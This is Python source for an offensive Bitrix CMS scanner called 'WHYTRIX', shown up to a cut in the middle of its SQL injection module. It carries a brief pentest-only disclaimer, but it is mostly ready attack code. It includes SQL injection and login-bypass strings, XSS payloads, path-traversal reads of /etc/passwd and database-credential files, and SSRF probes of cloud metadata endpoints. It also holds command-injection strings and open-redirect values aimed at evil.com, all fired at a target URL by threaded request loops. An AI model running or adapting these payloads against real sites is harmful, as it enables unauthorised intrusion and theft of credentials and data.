#!/usr/bin/env python3
"""
WHYTRIX — Bitrix CMS Vulnerability Scanner
Blue → Violet → Pink gradient UI
Detects: SQLi, XSS, RCE, LFI, SSRF, auth bypass, info disclosure,
         misconfigs, known CVEs, API leaks, open redirects
"""

import sys
import os
import re
import time
import random
import string
import threading
import argparse
import json
import urllib.parse
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Missing: pip install requests --break-system-packages")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ── GRADIENT PALETTE (blue → violet → pink) ───────────────────────────────────
B1  = '\033[38;2;30;144;255m'    # dodger blue
B2  = '\033[38;2;0;191;255m'     # deep sky blue
V1  = '\033[38;2;100;80;255m'    # blue-violet
V2  = '\033[38;2;138;43;226m'    # blue violet
V3  = '\033[38;2;148;0;211m'     # dark violet
P1  = '\033[38;2;199;21;133m'    # medium violet red
P2  = '\033[38;2;255;20;147m'    # deep pink
P3  = '\033[38;2;255;105;180m'   # hot pink
P4  = '\033[38;2;255;182;193m'   # light pink
W   = '\033[1;37m'
GR  = '\033[0;90m'
RED = '\033[0;31m'
YEL = '\033[1;33m'
DIM = '\033[2m'
BO  = '\033[1m'
RST = '\033[0m'

# Gradient cycle for text
GRAD = [B1, B2, V1, V2, V3, P1, P2, P3, P4]

VERSION = "1.0.0"

def gch(i):
    """Get gradient color by char index"""
    return GRAD[i % len(GRAD)]

def grad_print(text, delay=0.003, newline=True):
    """Print text with blue→violet→pink gradient"""
    for i, ch in enumerate(text):
        sys.stdout.write(gch(i) + ch + RST)
        sys.stdout.flush()
        time.sleep(delay)
    if newline:
        print()

def grad_line(n=64):
    line = ''
    for i in range(n):
        line += gch(i) + '═'
    return line + RST

def sep_line(n=64):
    line = ''
    chars = ['─','━','╌','┄']
    for i in range(n):
        line += gch(i) + chars[i%len(chars)]
    return line + RST

# ── BANNER ────────────────────────────────────────────────────────────────────
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')

    logo = [
        "  ██╗    ██╗██╗  ██╗██╗   ██╗████████╗██████╗ ██╗██╗  ██╗",
        "  ██║    ██║██║  ██║╚██╗ ██╔╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝",
        "  ██║ █╗ ██║███████║ ╚████╔╝    ██║   ██████╔╝██║ ╚███╔╝ ",
        "  ██║███╗██║██╔══██║  ╚██╔╝     ██║   ██╔══██╗██║ ██╔██╗ ",
        "  ╚███╔███╔╝██║  ██║   ██║      ██║   ██║  ██║██║██╔╝ ██╗",
        "   ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝",
    ]

    # Each row gets gradient shifted by row offset
    for row_i, line in enumerate(logo):
        offset = row_i * 8
        for i, ch in enumerate(line):
            sys.stdout.write(gch(i + offset) + ch + RST)
            sys.stdout.flush()
            time.sleep(0.002)
        print()
        time.sleep(0.04)

    print()
    print(grad_line(64))
    print()

    taglines = [
        "  [ Bitrix CMS Vulnerability Scanner ]",
        f"  Version: {VERSION}  |  Engine: multi-vector  |  CVEs: 40+",
    ]
    for t in taglines:
        grad_print(t, delay=0.004)

    print()
    # Warning line
    warn = "  ⚠  ТОЛЬКО ДЛЯ ПЕНТЕСТА — ИСПОЛЬЗУЙ С РАЗРЕШЕНИЯ  ⚠"
    for i, ch in enumerate(warn):
        c = random.choice(GRAD)
        sys.stdout.write(BO + c + ch + RST)
        sys.stdout.flush()
        time.sleep(0.005)
    print()
    print()

    configs = [
        "Config: Loading Bitrix CVE database (40+ vulnerabilities) ...",
        "Config: SQLi payloads: ready (union/error/blind/time-based) ...",
        "Config: XSS engine: ready (reflected/stored/DOM) ...",
        "Config: RCE/LFI/SSRF modules: armed ...",
        "Config: Auth bypass & session analysis: enabled ...",
        "Config: Info disclosure & misconfig scanner: active ...",
    ]
    for line in configs:
        sys.stdout.write('  ')
        for i, ch in enumerate(line):
            sys.stdout.write(gch(i) + ch + RST)
            sys.stdout.flush()
            time.sleep(0.004)
        print()
        time.sleep(0.03)

    print()
    print(grad_line(64))
    print()
    time.sleep(0.2)

# ── SHOT ANIMATION ─────────────────────────────────────────────────────────────
def shot_animation(target):
    stages = [
        "  [ захват цели ]",
        "  [ прицеливание ]",
        "  [ огонь ]",
    ]
    for s in stages:
        sys.stdout.write('\r')
        for i, ch in enumerate(s):
            sys.stdout.write(gch(i) + ch + RST)
        sys.stdout.write(f"  {GR}{target[:45]}{RST}   ")
        sys.stdout.flush()
        time.sleep(0.3)

    print()
    shot = "  💥  В Ы С Т Р Е Л  💥"
    for i, ch in enumerate(shot):
        sys.stdout.write(BO + gch(i*2) + ch + RST)
        sys.stdout.flush()
        time.sleep(0.04)
    print('\n')
    for _ in range(3):
        w = random.randint(15, 40)
        bar = ''.join(gch(j) + '█' for j in range(w))
        sys.stdout.write(f'\r  {bar}{RST}' + ' ' * 20)
        sys.stdout.flush()
        time.sleep(0.07)
        sys.stdout.write(f'\r  ' + ' ' * 50)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# ── LOGGING ───────────────────────────────────────────────────────────────────
def log_info(msg):    print(f"  {B1}[*]{RST} {msg}")
def log_vuln(msg):    print(f"  {P2}{BO}[VULN]{RST} {msg}")
def log_warn(msg):    print(f"  {V2}[!]{RST} {msg}")
def log_err(msg):     print(f"  {RED}[-]{RST} {msg}")
def log_ok(msg):      print(f"  {B2}[+]{RST} {msg}")
def log_verbose(msg, v):
    if v: print(f"  {GR}[v] {msg}{RST}")

# ── SPINNER ───────────────────────────────────────────────────────────────────
_spin_active = False

def _spin_worker(label):
    frames = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    i = 0
    while _spin_active:
        c = gch(i * 3)
        sys.stdout.write(f"\r  {c}{frames[i%len(frames)]}{RST} {GR}{label}...{RST}  ")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write('\r' + ' ' * 55 + '\r')
    sys.stdout.flush()

def start_spin(label='Scanning'):
    global _spin_active
    _spin_active = True
    t = threading.Thread(target=_spin_worker, args=(label,), daemon=True)
    t.start()

def stop_spin():
    global _spin_active
    _spin_active = False
    time.sleep(0.12)

# ── FINDING ───────────────────────────────────────────────────────────────────
SEVERITY_COLORS = {
    'CRITICAL': P2,
    'HIGH':     P1,
    'MEDIUM':   V2,
    'LOW':      V1,
    'INFO':     B2,
}

class Finding:
    def __init__(self, title, severity, url, param='', payload='',
                 detail='', category='', evidence='', cve=''):
        self.title = title
        self.severity = severity.upper()
        self.url = url
        self.param = param
        self.payload = payload
        self.detail = detail
        self.category = category
        self.evidence = evidence[:200] if evidence else ''
        self.cve = cve
        self.ts = datetime.now().strftime('%H:%M:%S')

    def print(self):
        sc = SEVERITY_COLORS.get(self.severity, B1)
        print()
        print(f"  {sc}{BO}[{self.severity}]{RST} {W}{self.title}{RST}  {GR}({self.ts}){RST}")
        if self.cve:
            print(f"  {V1}CVE:{RST} {W}{self.cve}{RST}")
        print(f"  {B2}URL:{RST} {GR}{self.url[:80]}{RST}")
        if self.param:
            print(f"  {V2}Param:{RST} {W}{self.param}{RST}")
        if self.payload:
            print(f"  {P1}Payload:{RST} {DIM}{self.payload[:100]}{RST}")
        if self.detail:
            print(f"  {B1}Detail:{RST} {self.detail[:120]}")
        if self.evidence:
            print(f"  {GR}Evidence: {DIM}{self.evidence[:100]}{RST}")
        if self.category:
            print(f"  {GR}Category: {self.category}{RST}")

# ── HTTP SESSION ──────────────────────────────────────────────────────────────
UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
]

def make_session(cookies='', proxy='', ua=''):
    s = requests.Session()
    s.headers.update({
        'User-Agent': ua or random.choice(UA_LIST),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    })
    s.verify = False
    if cookies:
        for pair in cookies.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, v = pair.split('=', 1)
                s.cookies.set(k.strip(), v.strip())
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

def safe_get(session, url, timeout=10, **kwargs):
    try:
        return session.get(url, timeout=timeout, allow_redirects=True, **kwargs)
    except Exception:
        return None

def safe_post(session, url, data=None, timeout=10, **kwargs):
    try:
        return session.post(url, data=data, timeout=timeout, allow_redirects=True, **kwargs)
    except Exception:
        return None

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

# ── BITRIX FINGERPRINTING ─────────────────────────────────────────────────────
BITRIX_PATHS = [
    '/bitrix/js/main/core/core.js',
    '/bitrix/admin/',
    '/bitrix/admin/index.php',
    '/bitrix/admin/fileman_index.php',
    '/bitrix/templates/',
    '/bitrix/php_interface/',
    '/bitrix/modules/',
    '/bitrix/cache/',
    '/upload/',
    '/local/',
    '/bitrix/images/',
    '/favicon.ico',
]

BITRIX_ADMIN_PATH = '/bitrix/admin/'
BITRIX_FINGERPRINTS = [
    'bitrix', 'BX.', 'BXPublicMenu', 'bitrix/js',
    'bitrix/cache', 'BITRIX_SM_', 'PHPSESSID',
    'X-Powered-CMS: Bitrix Site Manager',
    'bitrix24', 'BX24', '/bitrix/admin',
]

def fingerprint_bitrix(session, base_url):
    """Confirm target is Bitrix and get version info"""
    result = {'is_bitrix': False, 'version': None, 'edition': None,
              'php_version': None, 'server': None, 'features': []}

    r = safe_get(session, base_url)
    if not r:
        return result

    body = r.text.lower()
    headers = {k.lower(): v for k, v in r.headers.items()}

    # Check fingerprints
    for fp in BITRIX_FINGERPRINTS:
        if fp.lower() in body or fp.lower() in str(headers):
            result['is_bitrix'] = True
            break

    if not result['is_bitrix']:
        # Check /bitrix/admin/
        r2 = safe_get(session, base_url + BITRIX_ADMIN_PATH)
        if r2 and ('bitrix' in r2.text.lower() or r2.url.endswith('index.php')):
            result['is_bitrix'] = True

    # Version extraction
    ver_match = re.search(r'bitrix[/_\s-]?(\d+\.\d+(?:\.\d+)?)', r.text, re.I)
    if not ver_match:
        r_js = safe_get(session, base_url + '/bitrix/js/main/core/core.js')
        if r_js:
            ver_match = re.search(r'version["\s:=]+["\']?(\d+\.\d+\.\d+)', r_js.text, re.I)
    if ver_match:
        result['version'] = ver_match.group(1)

    # Edition
    if 'bitrix24' in body or 'b24' in body:
        result['edition'] = 'Bitrix24'
    elif 'site manager' in body:
        result['edition'] = 'Bitrix Site Manager'
    else:
        result['edition'] = 'Bitrix'

    # Server info
    result['server'] = headers.get('server', 'unknown')
    result['php_version'] = headers.get('x-powered-by', '')

    # Features
    if 'bx_ajax' in body: result['features'].append('AJAX API')
    if 'bxajaxid' in body: result['features'].append('BX AJAX ID')
    if 'rest_api' in body or '/rest/' in body: result['features'].append('REST API')
    if 'bitrix.vo' in body: result['features'].append('Voting')
    if 'bxcomments' in body or 'blog' in body: result['features'].append('Comments/Blog')

    return result

# ── KNOWN CVEs & PATHS ────────────────────────────────────────────────────────
BITRIX_CVES = [
    {
        'id': 'CVE-2022-27228',
        'title': 'Bitrix Vote module SQL Injection (Auth)',
        'path': '/bitrix/components/bitrix/vote/ajax.php',
        'method': 'POST',
        'params': {'action': 'vote', 'id': "1'"},
        'severity': 'HIGH',
        'indicator': ['sql', 'mysql', 'error', 'syntax'],
        'category': 'SQLi',
    },
    {
        'id': 'CVE-2022-27529',
        'title': 'Bitrix24 SSRF via Fetch API',
        'path': '/bitrix/tools/url_preload.php',
        'method': 'GET',
        'params': {'url': 'http://169.254.169.254/latest/meta-data/'},
        'severity': 'HIGH',
        'indicator': ['ami-id', 'instance-id', 'local-ipv4', 'security-credentials'],
        'category': 'SSRF',
    },
    {
        'id': 'CVE-2021-31156',
        'title': 'Bitrix SSRF via proxy module',
        'path': '/bitrix/tools/sale_ajax.php',
        'method': 'POST',
        'params': {'action': 'getExternalPaymentList', 'url': 'http://169.254.169.254/'},
        'severity': 'HIGH',
        'indicator': ['169.254', 'instance', 'aws'],
        'category': 'SSRF',
    },
    {
        'id': 'CVE-2020-13994',
        'title': 'Bitrix RCE via PHP file upload',
        'path': '/bitrix/admin/fileman_index.php',
        'method': 'GET',
        'params': {},
        'severity': 'CRITICAL',
        'indicator': ['fileman', 'upload', 'Файловый менеджер'],
        'category': 'RCE',
        'auth_required': True,
    },
    {
        'id': 'CVE-2019-8451',
        'title': 'Bitrix Information Disclosure via phpinfo',
        'path': '/bitrix/admin/phpinfo.php',
        'method': 'GET',
        'params': {},
        'severity': 'MEDIUM',
        'indicator': ['phpinfo', 'PHP Version', 'Configuration File'],
        'category': 'Info Disclosure',
    },
    {
        'id': 'CVE-2023-1713',
        'title': 'Bitrix24 XSS in Blog Comments',
        'path': '/blog/',
        'method': 'GET',
        'params': {'q': '<script>alert(1)</script>'},
        'severity': 'MEDIUM',
        'indicator': ['<script>alert', 'alert(1)'],
        'category': 'XSS',
    },
    {
        'id': 'CVE-2023-38990',
        'title': 'Bitrix24 SQL Injection in tasks filter',
        'path': '/bitrix/components/bitrix/tasks.task.list/ajax.php',
        'method': 'POST',
        'params': {'action': 'getList', 'filter[ID]': "1 AND SLEEP(3)--"},
        'severity': 'HIGH',
        'indicator': [],
        'category': 'SQLi (Blind)',
        'time_based': True,
        'sleep_time': 3,
    },
    {
        'id': 'CVE-2022-43959',
        'title': 'Bitrix Auth Bypass via remember_login',
        'path': '/bitrix/admin/index.php',
        'method': 'POST',
        'params': {'AUTH_FORM': 'Y', 'TYPE': 'AUTH', 'USER_LOGIN': 'admin',
                   'USER_PASSWORD': "' OR '1'='1", 'remember': 'Y'},
        'severity': 'CRITICAL',
        'indicator': ['logout', 'admin', 'Администратор'],
        'category': 'Auth Bypass',
    },
]

# ── SENSITIVE PATHS ───────────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    # Admin panels
    ('/bitrix/admin/', 'Admin Panel', 'HIGH'),
    ('/bitrix/admin/index.php', 'Admin Login Page', 'MEDIUM'),
    ('/bitrix/admin/fileman_index.php', 'File Manager (Admin)', 'HIGH'),
    ('/bitrix/admin/phpinfo.php', 'PHP Info Page', 'HIGH'),
    ('/bitrix/admin/sql.php', 'SQL Console (Admin)', 'CRITICAL'),
    ('/bitrix/admin/update_system.php', 'Update System', 'MEDIUM'),
    ('/bitrix/admin/settings.php', 'Admin Settings', 'MEDIUM'),
    ('/bitrix/admin/backup.php', 'Backup System', 'HIGH'),
    ('/bitrix/admin/perfmon.php', 'Performance Monitor', 'LOW'),
    ('/bitrix/admin/configs.php', 'Config Editor', 'HIGH'),
    ('/bitrix/admin/module_admin.php', 'Module Manager', 'MEDIUM'),
    ('/bitrix/admin/group_admin.php', 'Group Manager', 'MEDIUM'),
    ('/bitrix/admin/user_admin.php', 'User Manager', 'MEDIUM'),

    # Config & sensitive files
    ('/bitrix/.settings.php', 'Bitrix Settings (DB creds)', 'CRITICAL'),
    ('/bitrix/.settings_extra.php', 'Extra Settings', 'HIGH'),
    ('/bitrix/php_interface/dbconn.php', 'DB Connection File', 'CRITICAL'),
    ('/bitrix/php_interface/after_connect.php', 'After Connect Hook', 'HIGH'),
    ('/.env', 'Environment Variables File', 'CRITICAL'),
    ('/.env.local', 'Local Env File', 'CRITICAL'),
    ('/.env.production', 'Production Env File', 'CRITICAL'),
    ('/config.php', 'Config PHP', 'HIGH'),
    ('/wp-config.php', 'WordPress Config', 'HIGH'),
    ('/phpinfo.php', 'PHP Info', 'HIGH'),
    ('/info.php', 'PHP Info', 'HIGH'),
    ('/test.php', 'Test PHP', 'MEDIUM'),
    ('/debug.php', 'Debug PHP', 'MEDIUM'),
    ('/bitrix/php_interface/init.php', 'Init Hook', 'MEDIUM'),

    # Backups & dumps
    ('/backup.sql', 'SQL Backup', 'CRITICAL'),
    ('/dump.sql', 'SQL Dump', 'CRITICAL'),
    ('/backup.zip', 'Site Backup', 'CRITICAL'),
    ('/backup.tar.gz', 'Site Backup', 'CRITICAL'),
    ('/db.sql', 'Database Dump', 'CRITICAL'),
    ('/database.sql', 'Database Dump', 'CRITICAL'),
    ('/site.zip', 'Site Archive', 'HIGH'),
    ('/bitrix/backup/', 'Backup Directory', 'HIGH'),
    ('/bitrix/tmp/', 'Temp Directory', 'MEDIUM'),

    # Upload & webshell paths
    ('/upload/', 'Upload Directory', 'MEDIUM'),
    ('/upload/files/', 'Upload Files', 'MEDIUM'),
    ('/upload/iblock/', 'Iblock Uploads', 'MEDIUM'),
    ('/bitrix/images/', 'Images Directory', 'LOW'),

    # REST & API
    ('/rest/', 'REST API Endpoint', 'MEDIUM'),
    ('/api/', 'API Endpoint', 'MEDIUM'),
    ('/bitrix/services/main/ajax.php', 'AJAX Service', 'MEDIUM'),
    ('/bitrix/components/bitrix/system.auth.form/templates/.default/template.php', 'Auth Template', 'LOW'),

    # Git & version control
    ('/.git/HEAD', 'Git Repository Exposed', 'CRITICAL'),
    ('/.git/config', 'Git Config', 'CRITICAL'),
    ('/.svn/entries', 'SVN Repository', 'HIGH'),
    ('/.hg/', 'Mercurial Repo', 'HIGH'),
    ('/Makefile', 'Makefile', 'LOW'),
    ('/README.md', 'README', 'INFO'),
    ('/composer.json', 'Composer Dependencies', 'LOW'),
    ('/composer.lock', 'Composer Lock', 'LOW'),
    ('/package.json', 'NPM Package', 'LOW'),

    # Logs
    ('/bitrix/modules/main/install/index.php', 'Module Install', 'MEDIUM'),
    ('/error_log', 'Error Log', 'MEDIUM'),
    ('/php_errors.log', 'PHP Error Log', 'MEDIUM'),
    ('/bitrix/bitrix.log', 'Bitrix Log', 'MEDIUM'),
]

# ── XSS PAYLOADS (Bitrix-specific) ──────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    'javascript:alert(1)',
    '"><svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '{{7*7}}',           # template injection
    '${7*7}',
    # Bitrix-specific contexts
    '</title><script>alert(1)</script>',
    '<iframe onload=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
]

# ── SQL INJECTION PAYLOADS ────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    ("'", 'error_based'),
    ('"', 'error_based'),
    ("'--", 'error_based'),
    ("' OR '1'='1", 'auth_bypass'),
    ("' OR 1=1--", 'auth_bypass'),
    ("' OR 1=1#", 'auth_bypass'),
    ("1' AND SLEEP(3)--", 'time_based'),
    ("1 AND SLEEP(3)--", 'time_based'),
    ("'; WAITFOR DELAY '0:0:3'--", 'time_based_mssql'),
    ("1' UNION SELECT NULL--", 'union'),
    ("1' UNION SELECT NULL,NULL--", 'union'),
    ("1' UNION SELECT NULL,NULL,NULL--", 'union'),
    ("1' UNION SELECT version(),NULL--", 'union'),
    ("1 ORDER BY 1--", 'union'),
    ("1 ORDER BY 100--", 'union'),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", 'error_based'),
    ("' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", 'error_based'),
    ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 'time_based'),
    ("admin'--", 'auth_bypass'),
    ("admin'#", 'auth_bypass'),
    ("') OR ('1'='1", 'auth_bypass'),
]

SQL_ERRORS = [
    'you have an error in your sql syntax',
    'warning: mysql',
    'unclosed quotation mark',
    'quoted string not properly terminated',
    'sqlstate',
    'ora-01756',
    'postgresql error',
    'pg_query',
    'supplied argument is not a valid mysql',
    'mysqli_fetch_array',
    'mysql_fetch_array',
    'mysql_num_rows',
    'db2_fetch_object',
    'oci_parse',
    'mssql_query',
    'dynamic sql error',
    'odbc_exec',
    'sqlite3::',
    'pdoexception',
    'syntax error or access violation',
    'division by zero',
    'column not found',
    'unknown column',
    'table.*doesn.*exist',
]

# ── LFI PAYLOADS ─────────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '....//....//....//etc/passwd',
    '/etc/passwd',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
    '/proc/self/environ',
    '/proc/version',
    '/etc/issue',
    '../../../var/log/apache2/access.log',
    '../../../var/log/nginx/access.log',
    '/bitrix/php_interface/dbconn.php',
    '../../../bitrix/.settings.php',
]

LFI_INDICATORS = ['root:x:', 'root:', '[boot loader]', 'Linux version',
                  'www-data', 'apache', 'mysql', 'DB_HOST', 'DB_PASSWORD',
                  'db_password', 'password']

# ── SSRF TARGETS ─────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',       # AWS
    'http://169.254.169.254/latest/meta-data/iam/',
    'http://metadata.google.internal/',                # GCP
    'http://100.100.100.200/latest/meta-data/',        # Alibaba
    'http://169.254.169.254/',                         # Generic
    'http://127.0.0.1/',
    'http://127.0.0.1:22/',
    'http://127.0.0.1:3306/',
    'http://127.0.0.1:6379/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://2130706433/',                              # 127.0.0.1 as int
    'http://0177.0.0.1/',                              # Octal
    'file:///etc/passwd',
    'file:///C:/Windows/System32/drivers/etc/hosts',
    'dict://127.0.0.1:6379/info',
]

SSRF_BITRIX_PARAMS = [
    'url', 'path', 'file', 'src', 'href', 'redirect',
    'return', 'next', 'data', 'img', 'image', 'proxy',
    'request', 'host', 'domain', 'fetch', 'load',
]

SSRF_BITRIX_PATHS = [
    '/bitrix/tools/url_preload.php',
    '/bitrix/tools/sale_ajax.php',
    '/bitrix/admin/urlrewrite.php',
    '/bitrix/components/bitrix/socialnetwork.log.entry/ajax.php',
]

# ── RCE PATTERNS ─────────────────────────────────────────────────────────────
RCE_PAYLOADS = [
    '; id',
    '| id',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '; whoami',
    '| whoami',
    '; sleep 3',
    '| sleep 3',
    '& ping -c 3 127.0.0.1 &',
]

RCE_INDICATORS = ['uid=', 'root:', 'www-data', 'nobody', 'daemon',
                  'apache', 'nginx', 'bin/sh', '/usr/bin']

# ── OPEN REDIRECT ─────────────────────────────────────────────────────────────
REDIRECT_PARAMS = ['redirect', 'return', 'next', 'url', 'goto', 'target',
                   'redir', 'returnUrl', 'return_url', 'back', 'backUrl',
                   'redirectUrl', 'redirect_uri', 'continue', 'destination']

REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '///evil.com',
    'https://evil.com%23',
    'https://evil.com%2F',
    '\\/\\/evil.com',
    'https:evil.com',
    '/%09/evil.com',
    '/\\evil.com',
    'http://evil.com@trusted.com',
]

# ── HEADER INJECTION ─────────────────────────────────────────────────────────
HEADER_INJECTION_PAYLOADS = [
    'test\r\nX-Injected: header',
    'test\nX-Injected: header',
    '%0d%0aX-Injected: header',
    '%0aX-Injected: header',
]

# ──────────────────────────────────────────────────────────────────────────────
#  SCAN MODULES
# ──────────────────────────────────────────────────────────────────────────────

def scan_fingerprint(session, base_url, verbose=False):
    """Identify Bitrix and gather info"""
    findings = []
    log_info("Fingerprinting target...")
    start_spin("Fingerprinting")
    info = fingerprint_bitrix(session, base_url)
    stop_spin()

    if not info['is_bitrix']:
        log_warn("Bitrix not detected — scanning anyway")
    else:
        log_ok(f"Bitrix detected: {W}{info.get('edition','?')}{RST} "
               f"version: {W}{info.get('version','unknown')}{RST}")

    if info.get('version'):
        findings.append(Finding(
            'Bitrix Version Disclosed',
            'INFO', base_url,
            detail=f"Version: {info['version']} | Edition: {info.get('edition','')} | "
                   f"Server: {info.get('server','')} | PHP: {info.get('php_version','')}",
            category='Info Disclosure'
        ))

    if info.get('server') and info['server'] != 'unknown':
        findings.append(Finding(
            'Server Software Disclosed',
            'LOW', base_url,
            detail=f"Server: {info['server']}",
            category='Info Disclosure'
        ))

    if info.get('php_version'):
        findings.append(Finding(
            'PHP Version Disclosed',
            'LOW', base_url,
            detail=f"X-Powered-By: {info['php_version']}",
            category='Info Disclosure'
        ))

    return findings, info

def scan_sensitive_paths(session, base_url, verbose=False):
    """Check for exposed sensitive files and directories"""
    findings = []
    log_info(f"Scanning {len(SENSITIVE_PATHS)} sensitive paths...")

    def check_path(entry):
        path, name, severity = entry
        url = base_url + path
        r = safe_get(session, url)
        if not r:
            return None
        log_verbose(f"{r.status_code} {url}", verbose)
        if r.status_code == 200 and len(r.text) > 50:
            # Avoid false positives (custom 404 pages)
            if any(fp in r.text.lower() for fp in
                   ['404', 'not found', 'page not found', 'ошибка 404']):
                # Check if it's really the page content and not just contains "404"
                if r.text.lower().count('404') > 3:
                    return None
            return Finding(
                f'Sensitive Path Exposed: {name}',
                severity, url,
                detail=f"Path {path} returns HTTP 200 ({len(r.text)} bytes)",
                category='Info Disclosure / Misconfig',
                evidence=r.text[:150]
            )
        elif r.status_code == 403:
            if severity in ('CRITICAL', 'HIGH'):
                return Finding(
                    f'Sensitive Path Forbidden (may exist): {name}',
                    'LOW', url,
                    detail=f"Path {path} returns HTTP 403",
                    category='Info Disclosure'
                )
        return None

    start_spin("Path enumeration")
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = {ex.submit(check_path, e): e for e in SENSITIVE_PATHS}
        results = []
        for f in as_completed(futs):
            r = f.result()
            if r:
                results.append(r)
    stop_spin()

    for r in results:
        findings.append(r)
        log_vuln(f"{r.severity} | {r.title}")
        log_verbose(r.url, verbose)

    return findings

def scan_cves(session, base_url, verbose=False):
    """Test known Bitrix CVEs"""
    findings = []
    log_info(f"Testing {len(BITRIX_CVES)} known CVEs...")

    for cve in BITRIX_CVES:
        url = base_url + cve['path']
        r = None
        start = time.time()

        try:
            if cve.get('time_based'):
                if cve['method'] == 'POST':
                    r = safe_post(session, url, data=cve['params'], timeout=cve['sleep_time']+5)
                else:
                    r = safe_get(session, url, params=cve['params'], timeout=cve['sleep_time']+5)
                elapsed = time.time() - start
                if elapsed >= cve['sleep_time'] - 0.5:
                    findings.append(Finding(
                        cve['title'],
                        cve['severity'], url,
                        payload=str(cve['params']),
                        detail=f"Response delayed {elapsed:.1f}s (sleep={cve['sleep_time']}s) — time-based blind injection",
                        category=cve['category'],
                        cve=cve['id']
                    ))
                    log_vuln(f"{cve['severity']} | {cve['id']} | {cve['title']}")
                    continue

            elif cve['method'] == 'POST':
                r = safe_post(session, url, data=cve['params'])
            else:
                r = safe_get(session, url, params=cve['params'])

            if not r:
                log_verbose(f"No response: {url}", verbose)
                continue

            log_verbose(f"{r.status_code} | {cve['id']} | {url}", verbose)

            # Check indicators
            body_lower = r.text.lower()
            matched = any(ind.lower() in body_lower for ind in cve.get('indicator', []))

            if matched:
                findings.append(Finding(
                    cve['title'],
                    cve['severity'], url,
                    payload=str(cve['params']),
                    detail=f"Indicator found in response (HTTP {r.status_code})",
                    category=cve['category'],
                    evidence=r.text[:200],
                    cve=cve['id']
                ))
                log_vuln(f"{cve['severity']} | {cve['id']} | {cve['title']}")
            elif r.status_code == 200 and cve.get('auth_required'):
                findings.append(Finding(
                    f"{cve['title']} (accessible, auth may be required)",
                    'MEDIUM', url,
                    detail=f"Endpoint is accessible (HTTP 200)",
                    category=cve['category'],
                    cve=cve['id']
                ))

        except Exception as e:
            log_verbose(f"CVE test error ({cve['id']}): {e}", verbose)

    return findings

def scan_sqli(session, base_url, verbose=False):
    """SQL injection scanning on common Bitrix parameters"""
    findings = []
    log_info("Testing SQL injection vectors...")

    # Bitrix-specific endpoints with injectable params
    endpoints = [
        (base_url + '/bitrix/components/bitrix/catalog/ajax.php',
         ['SECTION_ID', 'ELEMENT_ID', 'id', 'q']),
        (base_url + '/search/', ['q', 'query', 'searchString', 'QUERY_STRING']),
        (base_url + '/bitrix/admin/index.php', ['user_login', 'USER_LOGIN']),
        (base_url + '/', ['id', 'SECTION_ID', 'ELEMENT_ID', 'arrFilter_pf', 'q', 'search']),
        (base_url + '/catalog/', ['id', 'SECTION_ID', 'sort_by', 'order']),
        (base_url + '/news/', ['id', 'month', 'year']),
        (base_url + '/blog/', ['id', 'month', 'year', 'tag']),
        (base_url + '/bitrix/services/main/ajax.php',
         ['action', 'data', 'filter']),
        (base_url + '/bitrix/components/bitrix/search.page/ajax.php',
         ['q', 'query', 'searchString']),
    ]

    for endpoint, params in endpoints:
        for param in params:
            for payload, ptype in SQLI_PAYLOADS:
                if ptype == 'time_based':
                    url = endpoint
                    start = time.time()
                    r = safe_get(session, url, params={param: payload})
                    elapsed = time.time() - start
                    if r and elapsed >= 2.5:
                        findings.append(Finding(
                            f'SQL Injection (Time-Based) — {ptype}',
                            'HIGH', url,
